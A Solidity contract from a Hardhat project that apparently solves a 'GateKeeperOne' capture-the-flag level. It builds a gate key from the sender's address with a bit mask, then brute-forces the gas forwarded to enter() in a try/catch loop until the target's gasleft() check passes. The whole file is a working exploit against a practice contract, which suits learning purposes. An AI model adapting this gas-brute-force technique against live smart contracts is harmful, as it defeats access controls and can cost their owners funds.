//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IGateKeeperOne {
    function enter(bytes8 _gateKey) external returns(bool);
}

contract GateKeeperOneAttackBrute {

    IGateKeeperOne public gateKeeperOneContract;

    event FoundGas(uint256);

    bytes8 public _gateKey;
    
    constructor(address _GkAddr) {
        gateKeeperOneContract = IGateKeeperOne(_GkAddr);
    }

    function attack(

        // uint _gasAmount
        ) 
        public {

       // bytes8 _gateKey;
       _gateKey = bytes8(uint64(uint160(msg.sender)) & 0xff0000000000ffff); 

        for (uint256 i ; i<8191; i++) {
        // supply enough gas in the multiples of 8191 to satisfy the gateTwo logic ==> gasleft() % 8191 == 0
        try gateKeeperOneContract.enter{gas : i + (8191*10)}(_gateKey) {             
            emit FoundGas(i);                                                      
            console.log("gasFound : ", i);
            // i = 423 (as seen in the hardhat node's console.log)
            return;
        } catch{}
        }       
    }

}